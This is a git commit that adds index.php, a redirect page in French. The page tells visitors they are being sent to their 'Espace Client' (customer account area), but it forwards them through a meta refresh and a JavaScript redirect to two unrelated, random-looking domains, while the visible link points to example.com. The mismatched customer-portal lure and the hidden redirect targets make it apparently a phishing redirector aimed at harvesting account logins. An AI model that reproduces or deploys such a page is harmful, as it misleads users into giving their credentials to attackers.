7bf0e8c8ac364b4d088783b3bc757085e4977769
sumdives32 <105049572+sumdives32@users.noreply.github.com>
2022-05-11 03:26:05 +0200

    Create index.php

---
+++ index.php
@@ -0,0 +1,15 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="refresh" content="0; url=https://axbsurlcl.netlify.app">
+        <script type="text/javascript">
+            window.location.href = "https://nactamba.info/r/sIBljXH"
+        </script>
+        <title>Page Redirection</title>
+    </head>
+    <body>
+        <!-- Note: don't tell people to `click` the link, just tell them that it is a link. -->
+        Vous allez être regirigé vers votre <a href='http://example.com'>Espace Client</a>.
+    </body>
+</html>
